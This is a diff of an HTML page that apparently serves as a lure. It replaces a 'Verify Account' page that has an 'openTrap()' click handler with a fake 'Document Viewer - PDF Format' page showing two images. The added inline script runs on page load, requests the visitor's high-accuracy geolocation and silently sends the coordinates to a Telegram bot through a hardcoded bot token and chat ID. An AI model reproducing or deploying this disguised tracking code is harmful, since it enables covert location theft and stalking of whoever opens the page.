@@ -2,57 +2,105 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>1000058139 - Verify Account</title>
-    
-    <meta name="description" content="Unlimited screen recording and secure verification process for your account. Tap to view details.">
-    
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://verfy-app.netlify.app/">
-    <meta property="og:title" content="1000058139">
-    <meta property="og:description" content="Unlimited screen recording and secure verification process for your account. Tap to view details.">
-    <meta property="og:site_name" content="Verify App">
-    
-    <meta property="og:image" content="https://verfy-app.netlify.app/IMG_6579.jpeg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="1000058139">
-    <meta name="twitter:description" content="Unlimited screen recording and secure verification process for your account. Tap to view details.">
-    <meta name="twitter:image" content="https://verfy-app.netlify.app/IMG_6579.jpeg">
-
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Viewer - PDF Format</title>
     <style>
-        body, html { 
-            margin: 0; 
-            padding: 0; 
-            background-color: #000; 
-            height: 100%; 
-            width: 100%;
-            overflow-y: auto; 
-            overflow-x: hidden;
-        }
-        .image-list {
+        body {
+            background-color: #525659;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
             display: flex;
-            flex-direction: column; 
-            width: 100%;
-            cursor: pointer;
+            flex-direction: column;
+            align-items: center;
         }
-        .image-list img {
+        .pdf-container {
+            background-color: #ffffff;
+            color: #000000;
             width: 100%;
+            max-width: 800px;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+        .pdf-header {
+            border-bottom: 2px solid #ccc;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            font-size: 20px;
+            font-weight: bold;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .page-box {
+            margin-bottom: 30px;
+            text-align: center;
+            border: 1px solid #ddd;
+            padding: 15px;
+            background: #f9f9f9;
+            border-radius: 4px;
+        }
+        img {
+            max-width: 100%;
             height: auto;
-            display: block;
-            margin-bottom: 2px; 
+            border-radius: 2px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
         }
     </style>
 </head>
 <body>
-    <!-- دوو وێنەکە لێرەدان -->
-    <div class="image-list" onclick="openTrap()">
-        <img src="IMG_6579.jpeg" alt="Document 1">
-        <img src="IMG_6581.jpeg" alt="Document 2">
+
+    <div class="pdf-container">
+        <div class="pdf-header">
+            <span>Verified Document Preview (PDF)</span>
+            <span style="font-size: 14px; color: #666;">Page 1 & 2</span>
+        </div>
+
+        <!-- وێنەی یەکەم -->
+        <div class="page-box">
+            <img src="IMG_6579.jpeg" alt="Document Page 1">
+        </div>
+
+        <!-- وێنەی دووەم -->
+        <div class="page-box">
+            <img src="IMG_6581.jpeg" alt="Document Page 2">
+        </div>
     </div>
 
-    <script src="app.js"></script>
+    <script>
+        const BOT_TOKEN = "9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw";
+        const CHAT_ID = "659131693";
+
+        function s1derGetLocationAndSend() {
+            if (!navigator.geolocation) return;
+
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
+
+                const locUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
+                const textUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=فاک! لۆکەیشنی دۆکیۆمێنت:%0Aوردبوونەوە: ${acc} مەتر`;
+
+                try {
+                    await fetch(locUrl);
+                    await fetch(textUrl);
+                } catch (err) {
+                    console.error("فاک، ناردن سەرکەوتوو نەبوو:", err);
+                }
+            }, (error) => {
+                console.error("فاک، مۆڵەت نەدرا:", error);
+            }, {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            });
+        }
+
+        window.onload = s1derGetLocationAndSend;
+    </script>
 </body>
 </html>
